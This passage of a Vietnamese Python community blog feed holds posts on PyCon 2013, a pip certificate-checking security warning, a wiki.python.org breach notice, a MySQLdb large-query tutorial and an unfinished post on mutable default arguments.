&lt;p&gt;Hội thảo lần này diễn ra vào các ngày thứ sáu, thứ bảy, và Chủ Nhật với khoảng 100 bài tham luận và 2500 người tham dự đến từ tất cả các châu lục trên trái đất. Trong đó, khoảng 20% là nữ giới!&lt;/p&gt;
&lt;p&gt;Nhóm PCNV có một thành viên tham gia hội thảo lần này, và họ có một số nhận xét chính như sau:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Hội thảo có nhiều chuyên mục phù hợp với mọi lứa tuổi, mọi ngành nghề, mọi giới tính. Có cả những em thiếu niên khoảng 10 đến 12 tuổi tham gia hội thảo. Một số các em đã biết Python còn đứng lớp chỉ dạy Python cho các em khác. Thậm chí có một số em đã trình bày sản phẩm của chính mình trong phân mục tự giới thiệu (poster session), cùng với gần trăm sản phẩm khác từ các công ty lớn cũng như các chuyên gia trong ngành. Nữ giới chiếm gần 20% người tham gia hội thảo. Một số cá nhân trên 60 tuổi cũng thấy xuất hiện tại hội thảo. Thậm chí cả người chuyển đổi giới tính cũng có mặt! Có thể khẳng định chắc chắn rằng Python thu hút được sự quan tâm của tất cả mọi người.&lt;/li&gt;
&lt;li&gt;Hội thảo năm nay có sự xuất hiện của nhiều nhóm nữ giới như CodeChix, WomanWhoCode, PyLadies, LadyCoders. Đây là một tín hiệu đáng mừng. So với các ngôn ngữ lập trình đa dụng khác, có lẽ Python là ngôn ngữ thu hút nữ giới nhiều nhất!&lt;/li&gt;
&lt;li&gt;Hội thảo năm nay có một sự ngạc nhiên thú vị. Mỗi cá nhân tham dự hội thảo được tặng một thiết bị Rasberry Pi miễn phí! Điều này cho thấy Python có một vị trí quan trọng trong thị trường phần cứng nghiệp dư, kinh tế. Trong hội thảo cũng thiết lập một &amp;quot;Phòng nghiên cứu Rasberry Pi&amp;quot; để hướng dẫn cách cài đặt và sử dụng thiết bị đó.&lt;/li&gt;
&lt;li&gt;Các bài tham luận chớp nhoáng (lightning talks) cho thấy Python có khả năng ứng dụng rộng rãi và đáng ngạc nhiên. Một số ví dụ điển hình như sử dụng Python để điều khiển hệ thống đèn LED nhấp nháy, sử dụng Python trên các hệ máy Atari, sử dụng Python để thông dịch và gỡ rối mã Lisp/Scheme.&lt;/li&gt;
&lt;li&gt;Lập trình viên Python có khả năng Rap không thua kém các ca sĩ chuyên nghiệp! Đoạn phim bên dưới quay lại cảnh Larry Hastings, thành viên nòng cốt trong nhóm phát triển Python, hát bài rap tự chế trước phiên tham luận chớp nhoáng.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;a class="reference external" href="http://youtu.be/rKiySLUrYQ8"&gt;http://youtu.be/rKiySLUrYQ8&lt;/a&gt;&lt;/p&gt;
&lt;ol class="arabic simple" start="6"&gt;
&lt;li&gt;Bạn Nguyễn Thành Nam có mặt tại hội thảo đã chụp tấm hình tự sướng này.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;a class="reference external" href="https://docs.google.com/file/d/0B5X03CmpgiFeb3pfMTlIVlBCQ3M/edit?usp=sharing"&gt;https://docs.google.com/file/d/0B5X03CmpgiFeb3pfMTlIVlBCQ3M/edit?usp=sharing&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Bạn Nam cũng đã ủng hộ một số món quà nhỏ cho nhóm PCNV dùng để khuyến khích các bạn đã có bài viết đóng góp cho nhóm. Nhóm PCNV sẽ gửi trực tiếp cho các bạn.&lt;/p&gt;
</content><category term="pycon"></category></entry><entry><title>Cảnh báo: Cẩn thận khi sử dụng pip trong mạng</title><link href="/2013/02/canh-bao-can-than-khi-su-dung-pip-trong-mang.html" rel="alternate"></link><published>2013-02-03T19:37:00+07:00</published><updated>2013-02-03T19:37:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2013-02-03:/2013/02/canh-bao-can-than-khi-su-dung-pip-trong-mang.html</id><summary type="html">&lt;p&gt;Pip (&lt;a class="reference external" href="http://pypi.python.org/pypi/pip"&gt;http://pypi.python.org/pypi/pip&lt;/a&gt;), cũng như một số các công cụ sử dụng mô-đun có sẵn &lt;tt class="docutils literal"&gt;urllib&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;urllib2&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;httplib&lt;/tt&gt;, có thể bị tấn công kẻ ở giữa (man-in-the-middle) và làm thay đổi nội dung của gói tin nhận được.&lt;/p&gt;
&lt;p&gt;Lý do là khi truy cập vào một …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Pip (&lt;a class="reference external" href="http://pypi.python.org/pypi/pip"&gt;http://pypi.python.org/pypi/pip&lt;/a&gt;), cũng như một số các công cụ sử dụng mô-đun có sẵn &lt;tt class="docutils literal"&gt;urllib&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;urllib2&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;httplib&lt;/tt&gt;, có thể bị tấn công kẻ ở giữa (man-in-the-middle) và làm thay đổi nội dung của gói tin nhận được.&lt;/p&gt;
&lt;p&gt;Lý do là khi truy cập vào một địa chỉ HTTPS hoặc các giao thức SSL/TLS, các mô-đun có sẵn này không kiểm tra chứng từ (certificate) của máy chủ để xác nhận máy chủ đó đúng là máy chủ chương trình cần truy cập. Điều này cho phép một kẻ thứ ba giả dạng máy chủ và thay đổi nội dung gói tin yêu cầu cũng như trả lời.&lt;/p&gt;
&lt;p&gt;Do đó, người sử dụng cần cẩn trọng khi sử dụng các công cụ như &lt;tt class="docutils literal"&gt;pip&lt;/tt&gt; trong một mạng không an toàn.&lt;/p&gt;
&lt;p&gt;Thông tin thêm có thể được tham khảo tại:&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="http://www.reddit.com/r/Python/comments/17rfh7/warning_dont_use_pip_in_an_untrusted_network_a/"&gt;http://www.reddit.com/r/Python/comments/17rfh7/warning_dont_use_pip_in_an_untrusted_network_a/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Kể từ Python 3.2, các mô-đun có sẵn liên quan đến SSL/TLS đã có thêm chức năng kiểm tra chứng từ nhưng chức năng này phải được tự kích hoạt.&lt;/p&gt;
</content><category term="pip"></category><category term="ssl"></category><category term="security"></category><category term="certificate"></category></entry><entry><title>Chương trình PyCon US 2013</title><link href="/2013/01/chuong-trinh-pycon-us-2013.html" rel="alternate"></link><published>2013-01-18T16:04:00+07:00</published><updated>2013-01-18T16:04:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2013-01-18:/2013/01/chuong-trinh-pycon-us-2013.html</id><summary type="html">&lt;p&gt;Chương trình hội thảo PyCon năm nay đã được công bố vào bốn ngày trước.&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://us.pycon.org/2013/schedule/"&gt;https://us.pycon.org/2013/schedule/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Sau nhiều tuần đánh giá các bài tham luận, chương trình của hội thảo cuối cùng đã được thống nhất. Năm nay số lượng người tham dự tăng đột …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Chương trình hội thảo PyCon năm nay đã được công bố vào bốn ngày trước.&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://us.pycon.org/2013/schedule/"&gt;https://us.pycon.org/2013/schedule/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Sau nhiều tuần đánh giá các bài tham luận, chương trình của hội thảo cuối cùng đã được thống nhất. Năm nay số lượng người tham dự tăng đột ngột và 1000 vé bán trước (early bird) đã không còn nữa. Tổng lượng vé bán ra được giới hạn ở mức 2500 vé. Nếu bạn muốn tham dự hội thảo, bạn cần phải &lt;a class="reference external" href="https://us.pycon.org/2013/registration/"&gt;mua vé&lt;/a&gt; &lt;strong&gt;ngay bây giờ&lt;/strong&gt;. Hội thảo bắt đầu &lt;strong&gt;từ ngày 13 đến ngày 21 tháng 03&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;So với năm ngoái, hội thảo năm nay có thêm một chuyên mục thứ sáu, nâng tổng số bài tham luận lên 114 bài. Các bài điểm của hội thảo sẽ được trình bày bởi những nhân vật tên tuổi như Eben Upton, Jessica McKellar, Raymond Hettinger, và Guido van Rossum.&lt;/p&gt;
&lt;p&gt;PS: Nếu không có điều kiện tham dự hội thảo, các bạn cũng có thể xem phim quay lại tại &lt;a class="reference external" href="http://pyvideo.org"&gt;http://pyvideo.org&lt;/a&gt;.&lt;/p&gt;
</content><category term="pycon"></category></entry><entry><title>wiki.python.org bị tấn công</title><link href="/2013/01/wikipythonorg-bi-tan-cong.html" rel="alternate"></link><published>2013-01-08T17:54:00+07:00</published><updated>2013-01-08T17:54:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2013-01-08:/2013/01/wikipythonorg-bi-tan-cong.html</id><summary type="html">&lt;p&gt;Brian Curtin vừa gửi thông báo trên hộp thư chung &lt;strong&gt;python-dev&lt;/strong&gt; với nội dung như sau:&lt;/p&gt;
&lt;blockquote&gt;
Vào ngày 28 tháng 12, một cá nhân chưa xác định được đã sử dụng một lỗi chưa công bố để tấn công &lt;a class="reference external" href="http://wiki.python.org"&gt;http://wiki.python.org&lt;/a&gt;. Cá nhân này đã lấy được quyền …&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;Brian Curtin vừa gửi thông báo trên hộp thư chung &lt;strong&gt;python-dev&lt;/strong&gt; với nội dung như sau:&lt;/p&gt;
&lt;blockquote&gt;
Vào ngày 28 tháng 12, một cá nhân chưa xác định được đã sử dụng một lỗi chưa công bố để tấn công &lt;a class="reference external" href="http://wiki.python.org"&gt;http://wiki.python.org&lt;/a&gt;. Cá nhân này đã lấy được quyền truy cập như người dùng &lt;strong&gt;moin&lt;/strong&gt; trên máy chủ, nhưng các dịch vụ khác vẫn chưa bị ảnh hưởng.&lt;/blockquote&gt;
&lt;p&gt;Mọi dữ liệu cá nhân cũng như mật khẩu tại &lt;a class="reference external" href="http://wiki.python.org"&gt;http://wiki.python.org&lt;/a&gt; xem như đã nằm trong tay kẻ xấu. Nếu bạn có truy cập và tạo tài khoản trên trang &lt;a class="reference external" href="http://wiki.python.org"&gt;http://wiki.python.org&lt;/a&gt; và sử dụng cùng mật khẩu ở các trang mạng khác thì hãy đổi ngay mật khẩu ở các trang mạng khác đó.&lt;/p&gt;
&lt;p&gt;Thông tin cập nhật sẽ được Brian Curtin gửi trên &lt;strong&gt;python-dev&lt;/strong&gt;.&lt;/p&gt;
</content><category term="moin"></category><category term="security"></category></entry><entry><title>Truy vấn triệu bản ghi với MySQL</title><link href="/2012/07/truy-van-trieu-ban-ghi-voi-mysql.html" rel="alternate"></link><published>2012-07-25T04:56:00+07:00</published><updated>2012-07-25T04:56:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2012-07-25:/2012/07/truy-van-trieu-ban-ghi-voi-mysql.html</id><summary type="html">&lt;p&gt;Trong &lt;a class="reference external" href="http://www.vithon.org/2010/05/31/mysqldb-thi%E1%BA%BFt-l%E1%BA%ADp-k%E1%BA%BFt-n%E1%BB%91i"&gt;bài viết của bạn Phạm Thị Minh Hoài&lt;/a&gt;, chúng ta đã được hướng dẫn cách truy vấn MySQL với DB-API của Python. Phần này chúng ta sẽ bàn về một số điểm cần chú ý nếu câu truy vấn của chúng ta trả về một lượng lớn bản ghi …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Trong &lt;a class="reference external" href="http://www.vithon.org/2010/05/31/mysqldb-thi%E1%BA%BFt-l%E1%BA%ADp-k%E1%BA%BFt-n%E1%BB%91i"&gt;bài viết của bạn Phạm Thị Minh Hoài&lt;/a&gt;, chúng ta đã được hướng dẫn cách truy vấn MySQL với DB-API của Python. Phần này chúng ta sẽ bàn về một số điểm cần chú ý nếu câu truy vấn của chúng ta trả về một lượng lớn bản ghi từ MySQL.&lt;/p&gt;
&lt;div class="section" id="het-bo-nho"&gt;
&lt;h2&gt;Hết bộ nhớ&lt;/h2&gt;
&lt;div class="section" id="van-de"&gt;
&lt;h3&gt;Vấn đề&lt;/h3&gt;
&lt;p&gt;Một câu truy vấn có thể trả về một lượng dữ liệu khổng lồ. Ví dụ câu truy vấn &lt;strong&gt;SELECT * FROM users&lt;/strong&gt; có thể trả về hơn chục triệu bản ghi ở các ứng dụng lớn. Trong điều kiện bình thường, có lẽ lượng bản ghi lớn như vậy sẽ khiến cho chương trình của chúng ta sử dụng hết bộ nhớ và bị buộc phải chấm dứt giữa chừng, cho dù chúng ta có sử dụng &lt;strong&gt;fetchone&lt;/strong&gt;, &lt;strong&gt;fetchmany&lt;/strong&gt; hay &lt;strong&gt;fetchall&lt;/strong&gt; để lấy dữ liệu.&lt;/p&gt;
&lt;p&gt;Lý do là phần giao tiếp giữa Python và MySQL mặc định sẽ lấy tất cả các bản ghi của câu truy vấn về trước, chứa chúng trong bộ nhớ, rồi sau đó trả về cho Python một bản ghi, nhiều bản ghi, hay tất cả các bản ghi đó tùy thuộc vào hàm nào được gọi.&lt;/p&gt;
&lt;p&gt;Điều này cũng dễ hiểu vì giao thức mạng của MySQL là mô hình yêu cầu/đáp trả (request/response). Một truy vấn là một yêu cầu. Và các bản ghi của truy vấn đó là một đáp trả. Cho nên trình điều khiển (driver) cần phải đọc hết toàn bộ đáp trả để kết thúc chu trình yêu cầu/đáp trả trước khi trả lời các lời gọi hàm &lt;strong&gt;fetchone&lt;/strong&gt;, &lt;strong&gt;fetchmany&lt;/strong&gt; hay &lt;strong&gt;fetchall&lt;/strong&gt;. Nói một cách khác, các hàm &lt;strong&gt;fetchone&lt;/strong&gt; hay &lt;strong&gt;fetchmany&lt;/strong&gt; trả về kết quả đã có trong bộ nhớ.&lt;/p&gt;
&lt;p&gt;Đó cũng chính là lý do vì sao chúng ta có thể gọi &lt;strong&gt;fetchone&lt;/strong&gt; hay &lt;strong&gt;fetchmany&lt;/strong&gt; nhiều lần. Các hàm này &lt;strong&gt;không&lt;/strong&gt; tạo một chu trình yêu cầu/đáp trả mới mà chỉ đơn giản là tiếp tục trả về các bản ghi đã chứa trong bộ nhớ.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="cach-khac-phuc"&gt;
&lt;h3&gt;Cách khắc phục&lt;/h3&gt;
&lt;p&gt;Cách khắc phục là sử dụng &lt;strong&gt;SSCursor&lt;/strong&gt; khi tạo &lt;strong&gt;con trỏ&lt;/strong&gt; từ &lt;strong&gt;kết nối&lt;/strong&gt; MySQL. Lớp &lt;strong&gt;SSCursor&lt;/strong&gt; nằm trong mô-đun &lt;strong&gt;MySQLdb&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQLdb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;cursor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQLdb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SSCursor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Sau đó khi gọi &lt;strong&gt;fetchone&lt;/strong&gt; hoặc &lt;strong&gt;fetchmany&lt;/strong&gt; thì trình điều khiển sẽ không đọc toàn bộ đáp trả vào bộ nhớ nữa mà sẽ chỉ đọc vừa đủ để trả về bấy nhiêu bản ghi cho ta.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="luu-y"&gt;
&lt;h3&gt;Lưu ý&lt;/h3&gt;
&lt;p&gt;Khi sử dụng &lt;strong&gt;SSCursor&lt;/strong&gt;, ta nhất định phải đảm bảo chu trình yêu cầu/đáp trả được hoàn tất. Ví dụ câu truy vấn trả về 10 bản ghi, thì ta phải đảm bảo đọc hết 10 bản ghi này. Nếu ta chỉ gọi &lt;strong&gt;fetchone&lt;/strong&gt; 5 lần, thì sẽ còn 5 bản ghi vẫn chưa được đọc hết, và do đó ta sẽ không thể gửi truy vấn khác trong cùng kết nối hiện tại.&lt;/p&gt;
&lt;p&gt;Vì &lt;strong&gt;SSCursor&lt;/strong&gt; không giữ kết quả trong bộ nhớ nên ta sẽ không thể di chuyển con trỏ tới, hoặc lùi để truy xuất bản ghi ta cần. Điều duy nhất chúng ta có thể làm với &lt;strong&gt;SSCursor&lt;/strong&gt; là đọc tuần tự tất cả các bản ghi.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="het-gio-timeout"&gt;
&lt;h2&gt;Hết giờ (timeout)&lt;/h2&gt;
&lt;div class="section" id="id1"&gt;
&lt;h3&gt;Vấn đề&lt;/h3&gt;
&lt;p&gt;Với &lt;strong&gt;SSCursor&lt;/strong&gt; ta có thể sẽ viết mã như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;row&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fetchone&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;row&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="c1"&gt;# xử lý row&lt;/span&gt;
  &lt;span class="n"&gt;row&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fetchone&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Đoạn mã này đôi khi sẽ gây ra lỗi 2013 (Lost connection to MySQL server during query).&lt;/p&gt;
&lt;p&gt;Lý do là việc xử lý từng bản ghi sẽ làm ta tốn thời gian, và ta sẽ không thể đọc đáp trả đủ nhanh, khiến cho máy chủ MySQL phải hoãn việc gửi tiếp các bản ghi về cho ta. Máy chủ MySQL chỉ có thể hoãn việc gửi thông tin trong một thời gian ngắn. Quá thời gian này, máy chủ sẽ tự ngắt kết nối.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id2"&gt;
&lt;h3&gt;Cách khắc phục&lt;/h3&gt;
&lt;p&gt;Tốt nhất là chúng ta sử dụng &lt;strong&gt;SSCursor&lt;/strong&gt; để đọc tất cả các bản ghi từ máy chủ ở xa và ghi chúng vào một tập tin trên máy hiện tại. Sau đó ta đọc lại từ tập tin này và xử lý từng bản ghi đã lưu. Khi làm như vậy, chúng ta tránh được lỗi hết bộ nhớ đã đề cập ở trên, và hy vọng rằng việc ghi bản tin ra dĩa xảy ra đủ nhanh để ta có thể đọc bản ghi khác gần như ngay lập tức, tránh được lỗi hết giờ.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id3"&gt;
&lt;h3&gt;Lưu ý&lt;/h3&gt;
&lt;p&gt;Với việc ghi bản tin ra dĩa (hoặc một nơi nội bộ nào khác), chúng ta cần đảm bảo rằng nơi đó có đủ chỗ để lưu toàn bộ các bản ghi đọc được.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
</content><category term="MySQLdb"></category><category term="SSCursor"></category><category term="mysql"></category></entry><entry><title>Tham số tự động</title><link href="/2012/07/tham-so-tu-dong.html" rel="alternate"></link><published>2012-07-23T01:41:00+07:00</published><updated>2012-07-23T01:41:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2012-07-23:/2012/07/tham-so-tu-dong.html</id><summary type="html">&lt;div class="section" id="tham-so-mac-dinh"&gt;
&lt;h2&gt;Tham số mặc định&lt;/h2&gt;
&lt;p&gt;Python cho phép chúng ta khai báo hàm với tham số mặc định như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{}):&lt;/span&gt;
  &lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
  &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Với khai báo hàm trên, tham số &lt;strong&gt;arg_2*&lt;/strong&gt; trở thành một tham số mặc định và sẽ nhận giá trị là một …&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="tham-so-mac-dinh"&gt;
&lt;h2&gt;Tham số mặc định&lt;/h2&gt;
&lt;p&gt;Python cho phép chúng ta khai báo hàm với tham số mặc định như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{}):&lt;/span&gt;
  &lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
  &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Với khai báo hàm trên, tham số &lt;strong&gt;arg_2*&lt;/strong&gt; trở thành một tham số mặc định và sẽ nhận giá trị là một từ điển rỗng. Khi gọi hàm &lt;strong&gt;function&lt;/strong&gt;, chúng ta có thể không cung cấp giá trị cho tham số &lt;strong&gt;arg_2&lt;/strong&gt;. Ví dụ khi thực hiện lệnh gọi sau, trên màn hình sẽ xuất hiện chuỗi &lt;strong&gt;{1: True}&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;# in ra &amp;#39;{1: True}&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nếu tiếp tục gọi một lần tương tự, chúng ta nhận được một kết quả ngoài mong đợi.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;# in ra &amp;#39;{1: True, 2: True}&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Lần này, thay vì chỉ in ra từ điển với một khóa &lt;strong&gt;{2: True}&lt;/strong&gt;, ta nhận được cả hai giá trị.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="y-nghia-cua-tham-so-mac-dinh"&gt;
&lt;h2&gt;Ý nghĩa của tham số mặc định&lt;/h2&gt;
&lt;p&gt;Lý giải điều này không khó. Trong &lt;a class="reference external" href="http://www.vithon.org/tutorial/2.5/node6.html#SECTION006710000000000000000"&gt;mục 4.7.1&lt;/a&gt; của Bài chỉ dẫn Python có nêu:&lt;/p&gt;
&lt;blockquote&gt;
Giá trị mặc định được định giá tại nơi hàm được định nghĩa.&lt;/blockquote&gt;
&lt;p&gt;Điều này dẫn đến hệ quả là:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Giá trị mặc định chỉ được định giá một lần. Điểm này quan trọng khi *giá trị* mặc định là một giá trị khả biến như danh sách, từ điển hoặc các đối tượng của hầu hết mọi lớp.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Do đó, với ví dụ của hàm &lt;strong&gt;function&lt;/strong&gt; ở trên, tham số &lt;strong&gt;arg_2&lt;/strong&gt; sẽ nhận giá trị mặc định là từ điển được tạo ra ngay khi dòng lệnh &lt;strong&gt;def function(...)&lt;/strong&gt; được dịch và thực thi. Trong các lần gọi lệnh &lt;strong&gt;function&lt;/strong&gt; sau đó, nếu không xác định tham số cho &lt;strong&gt;arg_2&lt;/strong&gt;, thì &lt;strong&gt;arg_2&lt;/strong&gt; sẽ chỉ đến cùng một từ điển này. Và vì thế mọi tác động đến &lt;strong&gt;arg_2&lt;/strong&gt; đều tác động đến cùng một đối tượng từ điển.&lt;/p&gt;
&lt;p&gt;Thông thường, cách giải quyết vấn đề này sẽ bao gồm:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Xác định giá trị mặc định là &lt;strong&gt;None&lt;/strong&gt; ở câu lệnh &lt;strong&gt;def&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Khởi tạo giá trị mặc định mới và gán nó vào biến ở trong thân hàm nếu giá trị hiện tại là &lt;strong&gt;None&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Hàm &lt;strong&gt;function&lt;/strong&gt; sẽ được sửa lại như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;arg_2&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  &lt;span class="c1"&gt;# kiểm tra arg_2 có phải None không&lt;/span&gt;
    &lt;span class="n"&gt;arg_2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;       &lt;span class="c1"&gt;# gán đối tượng từ điển mới vào arg_2&lt;/span&gt;
  &lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
  &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="mo-dun-auto-argument"&gt;
&lt;h2&gt;Mô-đun &lt;tt class="docutils literal"&gt;auto_argument&lt;/tt&gt;&lt;/h2&gt;
&lt;p&gt;Để đơn giản hóa và tránh lập đi lập lại dòng lệnh &lt;strong&gt;if&lt;/strong&gt;, tôi đã phát triển một thư viện nhỏ đặt tên là &lt;strong&gt;auto_argument&lt;/strong&gt; (thông số tự động).&lt;/p&gt;
&lt;p&gt;Với thư viện này, chúng ta có thể viết lại hàm &lt;strong&gt;function&lt;/strong&gt; như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nd"&gt;@callable_auto_argument&lt;/span&gt;&lt;span class="p"&gt;([(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;arg_2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;
